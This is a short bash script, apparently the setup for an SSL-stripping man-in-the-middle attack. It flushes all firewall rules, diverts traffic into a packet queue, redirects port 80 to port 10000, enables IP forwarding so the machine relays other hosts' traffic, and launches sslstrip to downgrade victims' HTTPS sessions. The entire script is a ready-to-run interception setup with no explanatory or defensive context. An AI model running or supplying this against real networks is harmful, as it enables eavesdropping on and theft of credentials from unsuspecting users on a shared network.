#!/usr/bin/env bash 

iptables --flush

iptables -I OUTPUT -j NFQUEUE --queue-num 0

iptables -I INPUT -j NFQUEUE --queue-num 0

iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

echo 1 > /proc/sys/net/ipv4/ip_forward

sslstrip